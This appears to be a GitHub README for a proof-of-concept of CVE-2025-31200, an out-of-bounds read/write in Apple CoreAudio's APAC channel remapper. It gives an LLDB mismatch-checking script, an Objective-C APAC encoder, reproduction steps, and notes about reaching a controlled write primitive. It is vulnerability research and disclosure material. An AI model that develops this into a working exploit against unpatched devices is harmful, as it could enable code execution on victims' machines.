
# CVE-2025-31200 - Apple CoreAudio APACChannelRemapper Exploit (PoC)

This repository demonstrates a proof-of-concept for CVE-2025-31200, a vulnerability in Apple's CoreAudio `APACChannelRemapper::Process` function, discovered in iOS 18.4 and patched in iOS 18.4.1 / macOS 15.4.1.

---

## 🔍 Overview

- **Vulnerability**: CVE-2025-31200
- **Affected Component**: `AudioCodecs` → `APACChannelRemapper::Process`
- **Issue**: Out-of-Bounds Read/Write via mRemappingArray mismatch
- **PoC Requirement**: macOS < 15.4.1
- **Trigger**: Playing a specially crafted `.mp4` (APAC audio) file
- **Impact**: Controlled write primitive with potential for RCE

---

## 💻 Technologies Used

| Component            | Description |
|---------------------|-------------|
| AudioToolbox        | CoreAudio framework |
| APAC                | Apple Positional Audio Codec |
| HOA                 | Higher-order Ambisonics |
| LLDB                | Debugger (used to inspect mismatch) |
| afconvert           | Used to convert WAV to APAC format |
| GuardMalloc         | Detect memory corruption during playback |
| Xcode               | Debugging on macOS |
| output.mp4          | Crafted test audio file |

---

## 📜 1. LLDB Hook Script: `check-mismatch.py`

```python
import lldb

def __lldb_init_module(debugger, internal_dict):
    debugger.HandleCommand('command script add -f check_mismatch.check_mismatch check-mismatch')

def check_mismatch(debugger, command, result, internal_dict):
    target = debugger.GetSelectedTarget()
    process = target.GetProcess()
    thread = process.GetSelectedThread()
    frame = thread.GetSelectedFrame()

    try:
        mRemappingArray_expr = "((APACChannelRemapper *)$x0)->mRemappingArray"
        layout_expr = "((APACChannelRemapper *)$x0)->mChannelLayout"

        remap_val = frame.EvaluateExpression(mRemappingArray_expr)
        layout_val = frame.EvaluateExpression(layout_expr)

        if remap_val.IsValid() and layout_val.IsValid():
            count_remap = remap_val.GetNumChildren()
            count_layout = layout_val.GetChildMemberWithName("mNumberChannelDescriptions").GetValueAsUnsigned()

            print(f"[check-mismatch] remappingArray size: {count_remap}")
            print(f"[check-mismatch] mChannelDescriptions count: {count_layout}")

            if count_remap != count_layout:
                print("[check-mismatch] ❗️Mismatch detected!")
            else:
                print("[check-mismatch] ✅ Arrays are consistent")
        else:
            print("[check-mismatch] Error: Unable to resolve remappingArray or layout")
    except Exception as e:
        print(f"[check-mismatch] Exception: {e}")
```

Usage:
```lldb
command script import check-mismatch.py
check-mismatch
```

---

## 🎵 2. PoC Encoder: `encodeme.mm`

```objc
#import <AudioToolbox/AudioToolbox.h>

void encodeToAPAC() {
    NSString *inputPath = @"/path/to/input.wav";
    NSString *outputPath = @"/path/to/output_apac.m4a";

    NSURL *inputURL = [NSURL fileURLWithPath:inputPath];
    NSURL *outputURL = [NSURL fileURLWithPath:outputPath];

    ExtAudioFileRef inFile = NULL;
    ExtAudioFileRef outFile = NULL;
    OSStatus status;

    AudioStreamBasicDescription inFormat;
    UInt32 propSize = sizeof(inFormat);

    status = ExtAudioFileOpenURL((__bridge CFURLRef)inputURL, &inFile);
    ExtAudioFileGetProperty(inFile, kExtAudioFileProperty_FileDataFormat, &propSize, &inFormat);

    AudioStreamBasicDescription apacFormat = {0};
    apacFormat.mSampleRate = 48000;
    apacFormat.mFormatID = kAudioFormatAPAC;
    apacFormat.mChannelsPerFrame = 4;
    apacFormat.mFramesPerPacket = 1024;

    ExtAudioFileCreateWithURL((__bridge CFURLRef)outputURL,
                               kAudioFileM4AType,
                               &apacFormat,
                               NULL,
                               kAudioFileFlags_EraseFile,
                               &outFile);

    ExtAudioFileSetProperty(outFile, kExtAudioFileProperty_ClientDataFormat, sizeof(inFormat), &inFormat);

    UInt32 bufferSize = 4096;
    UInt8 buffer[bufferSize];
    AudioBufferList bufferList = {0};
    bufferList.mNumberBuffers = 1;
    bufferList.mBuffers[0].mData = buffer;
    bufferList.mBuffers[0].mDataByteSize = bufferSize;
    bufferList.mBuffers[0].mNumberChannels = inFormat.mChannelsPerFrame;

    while (true) {
        UInt32 frameCount = bufferSize / inFormat.mBytesPerFrame;
        status = ExtAudioFileRead(inFile, &frameCount, &bufferList);
        if (frameCount == 0 || status != noErr) break;
        ExtAudioFileWrite(outFile, frameCount, &bufferList);
    }

    ExtAudioFileDispose(inFile);
    ExtAudioFileDispose(outFile);
}
```

---

## 🧪 3. Reproduction Steps

1. Setup a macOS < 15.4.1 system
2. Convert audio using `encodeme.mm` or:
```bash
afconvert -o output.mp4 -d apac -f mp4f sound440hz.wav
```
3. Enable **GuardMalloc** in Xcode
4. Debug with LLDB:
```bash
lldb ./your_audio_player
run output.mp4
check-mismatch
```

---

## 📎 Notes

- The `kAudioFormatAPAC` may require a manual define: `#define kAudioFormatAPAC 'apac'`
- Internals may vary slightly depending on your system version.

---

MIT License










------------------------------------------------------------
저자설명

Proof-of-concept for the CoreAudio patch (CVE-2025-31200) in [iOS 18.4.1](https://support.apple.com/en-us/122282).

# Update 05/27/2025
I have been able to push this to a *controlled* if not arbitrary write. The writeup is coming soon. In order to see for yourself though, you'll have to build on a version of macos before the patch: < 15.4.1. You can play the audio with the check-mismatch lldb hook (using a simple harness that just plays the audio) in order to see the write. It is not a great arbitrary write yet, as I mentioned above for a few reasons - but mainly because I am still not 100% sure at what stage of the decoding pipeline these values from the frame buffer are at when they are remapped. I am stopping here though to work on the writeup if somebody wants to take it up.

# Update 05/21/2025
I @noahhw46 (couldn't have done it without this setup @zhouwei) figured it out (writeup coming soon). However, there is still a lot more to understand. I added the first bit of the next steps of my investigation here in order to show exactly what the bug *does*. check-mismatch is another lldb script that can be used with a working poc to show exactly the mismatch that was created between the mRemappingArray and the permutation map in `APACChannelRemapper::Process` (really in `APACHOADecoder::DecodeAPACFrame`).

----

```
The mRemappingArray is sized based on the lower two bytes of mChannelLayoutTag.
By creating a mismatch between them, a later stage of processing in APACHOADecoder::DecodeAPACFrame is corrupted.
When the APACHOADecoder goes to process the APAC frame (permute it according to the channel remapping array), it uses the mRemappingArray as the permutation map to do the well, channel remapping. It seems like the frame data that is being remapped is sized based on mTotalComponenets.
```

When you play the `output.mp4` audio file (e.g. with AVAudioPlayer), `APACChannelRemapper::Process` will read then write out of bounds.

You can see the first read out of bounds if you enable Guard Malloc in Xcode:

<img width="1024" alt="Xcode displaying crash in APACChannelRemapper::Process" src="https://github.com/user-attachments/assets/c733936b-2b91-43a2-9047-5651b66ce81d" />

Without Guard Malloc, `APACHOADecoder::DecodeAPACFrame` will later crash with an invalid `memmove`:

<img width="1024" alt="Xcode displaying crash in _platform_memmove" src="https://github.com/user-attachments/assets/9fddfbea-e9a8-4672-acf9-c5b193fefe95" />

----

@zhuowei's Previous README is below:


Trying to understand the CoreAudio patch (CVE-2025-31200) in [iOS 18.4.1](https://support.apple.com/en-us/122282).

I haven't figure it out yet.

Currently, I get different error messages when decoding `output.mp4` on macOS 15.4.1:

```
error	01:10:26.743480-0400	getaudiolength	<private>:548    Invalid mRemappingArray bitstream in hoa::CodecConfig::Deserialize()
error	01:10:26.743499-0400	getaudiolength	<private>:860    Error in deserializing ASC components
```

vs Xcode Simulator for visionOS 2.2:

```
error	01:09:21.841805-0400	VisionOSEvaluation	          APACProfile.cpp:424    ERROR: Wrong profile index in GlobalConfig
error	01:09:21.841914-0400	VisionOSEvaluation	     APACGlobalConfig.cpp:894    Profile and level data could not be validated
```

so I am hitting the new check, but I don't know how to get it to actually overwrite something.

## info on the changed function

The changed function [seems](https://github.com/blacktop/ipsw-diffs/blob/main/18_4_22E240__vs_18_4_1_22E252/README.md) to be `apac::hoa::CodecConfig::Deserialize` in `/System/Library/Frameworks/AudioToolbox.framework/AudioCodecs`.

APAC is [Apple Positional Audio Codec](https://support.apple.com/en-by/guide/immersive-video-utility/dev4579429f0/web#:~:text=Apple%20Positional%20Audio%20Codec)

HOA is [Higher-order Ambisonics](https://en.wikipedia.org/wiki/Ambisonics#Higher-order_Ambisonics).

If you look at a [sample file from ffmpeg issue tracker](https://trac.ffmpeg.org/ticket/11480):

```
$ avmediainfo ~/Downloads/clap.MOV 
Asset: /Users/zhuowei/Downloads/clap.MOV
<...>
Track 3: Sound 'soun'
	Enabled: No
	Format Description 1:
		Format: APAC 'apac'
		Channel Layout: High-Order Ambisonics, ACN/SN3D
		Sample rate: 48000.0
		Bytes per packet: 0
		Frames per packet: 1024
		Bytes per frame: 0
		Channels per frame: 4
		Bits per channel: 0
	System support for decoding this track: Yes
	Data size: 43577 bytes
	Media time scale: 48000
	Duration: 0.898 seconds
	Estimated data rate: 363.142 kbit/s
	Extended language tag: und
	1 segment present
	Index   Media Start  Media Duration   Track Start  Track Duration 
	    1  00:00:00.000    00:00:00.898  00:00:00.000    00:00:00.898
	Member of alternate group 0: (2, 3)
```

You can convert to APAC with `afconvert -o sound440.m4a -d apac -f mp4f sound440hz.wav`.

Using `bindiff` on iOS 18.4.1 vs 18.4, it seems reading the `mRemappingArray` now checks the global `AudioChannelLayout*` at offset 0x58 for the number of channels instead of the remapping `AudioChannelLayout*` at offset 0x78.

The `encodeme.mm` file encodes APAC, and an LLDB script forces extra elements into `mRemappingArray` and the remapping `AudioChannelLayout`:

```
./build_encodeme.sh
./run_encodeme.sh
```

